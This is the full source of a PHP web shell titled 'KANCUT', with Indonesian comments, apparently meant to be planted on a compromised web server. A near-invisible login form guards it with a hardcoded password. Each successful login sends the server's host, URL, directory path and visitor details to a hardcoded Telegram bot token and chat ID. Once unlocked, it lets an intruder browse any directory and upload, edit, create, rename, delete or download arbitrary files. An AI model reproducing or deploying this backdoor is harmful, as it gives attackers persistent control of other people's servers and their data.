<?php
session_start();

$root_dir = realpath(__DIR__);
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root_dir;

// Telegram Bot Token and Chat ID
$telegram_token = '8002782544:AAEK96w271GOt6KCr7_bAFVZ80yqJUCJnGI';
$chat_id = '7135568224';

function sendTelegramMessage($message) {
    global $telegram_token, $chat_id;
    $url = "https://api.telegram.org/bot$telegram_token/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    file_get_contents($url . '?' . http_build_query($data));
}

function logUserAccess() {
    $ip_address = $_SERVER['REMOTE_ADDR'];
    $timestamp = date('Y-m-d H:i:s');
    $host = $_SERVER['HTTP_HOST'];
    $script_name = $_SERVER['SCRIPT_NAME'];
    $url = "http://$host$script_name";
    $directory = realpath(__DIR__);
    $user_agent = $_SERVER['HTTP_USER_AGENT']; 

    $message = "User accessed the system:\n";
    $message .= "IP Address: $ip_address\n";
    $message .= "Timestamp: $timestamp\n";
    $message .= "Host: $host\n";
    $message .= "URL: $url\n";
    $message .= "Directory Location: $directory\n";
    $message .= "User Agent: $user_agent\n";

    sendTelegramMessage($message);
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_POST['password']) && $_POST['password'] === 'sempak') {
        $_SESSION['loggedin'] = true; 
        logUserAccess(); 
    } else {
        $error_message = "Oni-chan BAKKA!!";
    }
}

if (!isset($_SESSION['loggedin']) || !$_SESSION['loggedin']) {
    ?>
    <!DOCTYPE html>
<html>
<head>
    <title>KANCUT</title>
    <style>
        body {
            background: url('https://images.hdqwalls.com/wallpapers/love-live-sunshine-404-error-4k-wo.jpg') no-repeat center center fixed; 
            background-size: cover;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
        }
        .login-container {
            background-color: rgba(255, 255, 255, 0);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 0px rgba(0, 0, 0, 0);
            position: absolute;
            top: 1px;
            left: 1px;
        }
        .error-message {
            color: red;
        }

        input[type="password"] {
            width: 100%;
            padding: 1px;
            margin: 1px 0;
            border: 0px;
            background-color: rgba(255, 255, 255, 0);
        }
        button {
            background-color: rgba(255, 255, 255, 0); /* Fully transparent */
            color: transparent; /* Hide text color */
            border: none; /* No border */
            padding: 0px; /* Padding for button */
            border-radius: 0px; /* Rounded corners */
            cursor: pointer; /* Change cursor on hover */
            position: relative; /* Position for better layout */
            width: 0%; /* Make button full width */
            height: 0px; /* Set a height for the button */
        }
        button:hover {
            background-color: rgba(255, 255, 255, 0.3); /* Slightly visible on hover */
        }
    </style>
</head>
<body>
    <div class="login-container">
        <?php if (isset($error_message)): ?>
            <p class="error-message"><?php echo $error_message; ?></p>
        <?php endif; ?>
        <form method="post">
            <input type="password" name="password" required>
            <button type="submit"></button>
        </form>
    </div>
</body>
</html>
    <?php
    exit; 
}
// Periksa jika direktori yang diminta valid dan dapat diakses
if (!$current_dir || !is_dir($current_dir)) {
    $current_dir = $root_dir; // Jika direktori tidak valid, kembali ke root_dir
}

// Fungsi untuk menampilkan list file & folder, dengan folder di atas dan file di bawah
function listDirectory($dir)
{
    $files = scandir($dir);

    // Array untuk menyimpan folder dan file terpisah
    $directories = [];
    $regular_files = [];

    // Pisahkan folder dan file ke dalam array yang berbeda
    foreach ($files as $file) {
        if ($file != "." && $file != "..") {
            if (is_dir($dir . '/' . $file)) {
                $directories[] = $file;  // Masukkan ke array folder
            } else {
                $regular_files[] = $file; // Masukkan ke array file biasa
            }
        }
    }

    // Tampilkan folder di atas
    foreach ($directories as $directory) {
        echo '<tr>';
        echo '<td><a href="?dir=' . urlencode($dir . '/' . $directory) . '">📁 ' . $directory . '</a></td>';
        echo '<td>Folder</td>';
        echo '<td>
            <a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($directory) . '">Edit</a> |
            <a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($directory) . '">Delete</a> |
            <a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($directory) . '">Rename</a> |
            <a href="?dir=' . urlencode($dir) . '&download=' . urlencode($directory) . '">Download</a>
        </td>';
        echo '</tr>';
    }

    // Tampilkan file di bawah
    foreach ($regular_files as $file) {
        echo '<tr>';
        echo '<td>' . $file . '</td>';
        echo '<td>' . filesize($dir . '/' . $file) . ' bytes</td>';
        echo '<td>
            <a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($file) . '">Edit</a> |
            <a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($file) . '">Delete</a> |
            <a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($file) . '">Rename</a> |
            <a href="?dir=' . urlencode($dir) . '&download=' . urlencode($file) . '">Download</a>
        </td>';
        echo '</tr>';
    }
}

// Fungsi untuk menghapus file
if (isset($_GET['delete'])) {
    $file_to_delete = $current_dir . '/' . $_GET['delete'];
    if (is_file($file_to_delete)) {
        unlink($file_to_delete);
    }
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

// Fungsi untuk download file
if (isset($_GET['download'])) {
    $file_to_download = $current_dir . '/' . $_GET['download'];
    if (is_file($file_to_download)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_to_download) . '"');
        header('Content-Length: ' . filesize($file_to_download));
        readfile($file_to_download);
        exit;
    }
}

// Fungsi untuk rename file
if (isset($_POST['rename_file'])) {
    $old_name = $current_dir . '/' . $_POST['old_name'];
    $new_name = $current_dir . '/' . $_POST['new_name'];
    rename($old_name, $new_name);
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

// Fungsi untuk upload file
if (isset($_POST['upload'])) {
    $target_file = $current_dir . '/' . basename($_FILES["file"]["name"]);
    move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

// Fungsi untuk mengedit file
if (isset($_POST['save_file'])) {
    $file_to_edit = $current_dir . '/' . $_POST['file_name'];
    $new_content = $_POST['file_content'];
    file_put_contents($file_to_edit, $new_content);
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

// Fungsi untuk membuat file baru
if (isset($_POST['create_file'])) {
    $new_file_name = $_POST['new_file_name'];
    $new_file_path = $current_dir . '/' . $new_file_name;
    // Buat file baru dengan konten kosong
    file_put_contents($new_file_path, "");
    header("Location: ?dir=" . urlencode($_GET['dir']));
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Kancut</title>
    <style>
        /* Styling dengan tema gelap (latar belakang hitam dan teks terang) */
        body {
            background-image: url('https://wallpapercave.com/wp/wp8106609.png');
            background-size: cover; /* Ukuran gambar mengikuti ukuran viewport */
            background-position: center; /* Memusatkan gambar */
            background-attachment: fixed; /* Mengatur gambar agar tetap pada posisinya saat menggulir */
        }
        h2 {
            color: #BB86FC;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 10px;
            text-align: left;
        }
        th {
            background-color: #333;
            color: #BB86FC;
        }
        tr:hover {
            color: ;
            background-image: url('https://c4.wallpaperflare.com/wallpaper/929/770/396/anime-anime-girls-azur-lane-glowing-eyes-wallpaper-preview.jpg');
            background-size: cover; /* Mengatur ukuran gambar latar belakang */
            background-position: center; /* Memusatkan gambar latar belakang */
            background-attachment: fixed; /* Gambar tetap saat menggulir */
            opacity: 0.5; /* Tingkat opacity untuk memudar */
            transition: opacity 0.3s ease; /* Transisi untuk efek memudar */
            z-index: 0; /* Mengatur z-index agar di bawah teks */
            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.7); /* Bayangan teks berwarna hitam */
        }
        a {
            color: #03DAC6;
            text-decoration: none;
        }
        a:hover {
            color: #BB86FC;
        }
        button {
            background-color: #03DAC6;
            color: #121212;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
        }
        button:hover {
            background-color: #BB86FC;
        }
        textarea {
            width: 100%;
            height: 400px;
            background-color: #222;
            color: #E0E0E0;
            border: 1px solid #BB86FC;
        }
        input[type="file"], input[type="text"] {
            color: #E0E0E0;
            background-color: #222;
            border: 1px solid #BB86FC;
            padding: 10px;
        }
        .form-container {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        .form-container form {
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <p>Current Directory: <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" style="color: #03DAC6;"><?php echo $current_dir; ?></a></p>

    <!-- Add PHP information section -->
    <div style="margin: 20px; padding: 10px; background-color: rgba(255, 255, 255, 0.8); border-radius: 5px;">
        <h2>PHP Information</h2>
        <p><strong>PHP Version:</strong> <?php echo phpversion(); ?></p>
        <p><strong>Server Software:</strong> <?php echo $_SERVER['SERVER_SOFTWARE']; ?></p>
        <p><strong>Session Status:</strong> <?php echo isset($_SESSION['loggedin']) ? 'Logged In' : 'Logged Out'; ?></p>
        <p><strong>Client IP Address:</strong> <?php echo $_SERVER['REMOTE_ADDR']; ?></p>
    </div>

    
    <div class="form-container">
        <!-- Form untuk upload file -->
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file">
            <button type="submit" name="upload">Upload</button>
        </form>

        <!-- Form untuk membuat file baru -->
        <form method="post">
            <input type="text" name="new_file_name" placeholder="New file name" required>
            <button type="submit" name="create_file">Create File</button>
        </form>
    </div>

    <table border="1">
        <thead>
            <tr>
                <th>File Name</th>
                <th>Size</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php listDirectory($current_dir); ?>
        </tbody>
    </table>

    <!-- Form untuk rename file -->
    <?php if (isset($_GET['rename'])): ?>
    <form method="post">
        <input type="hidden" name="old_name" value="<?php echo $_GET['rename']; ?>">
        <input type="text" name="new_name" placeholder="New name" style="width: 100%; padding: 10px;">
        <button type="submit" name="rename_file">Rename</button>
    </form>
    <?php endif; ?>

    <!-- Form untuk mengedit file -->
    <?php
    if (isset($_GET['edit'])):
        $file_to_edit = $current_dir . '/' . $_GET['edit'];
        if (is_file($file_to_edit)) {
            $file_content = file_get_contents($file_to_edit);
            ?>
            <form method="post">
                <input type="hidden" name="file_name" value="<?php echo $_GET['edit']; ?>">
                <textarea name="file_content"><?php echo htmlspecialchars($file_content); ?></textarea>
                <br>
                <button type="submit" name="save_file">Save Changes</button>
            </form>
        <?php }
    endif; ?>
</body>
</html>
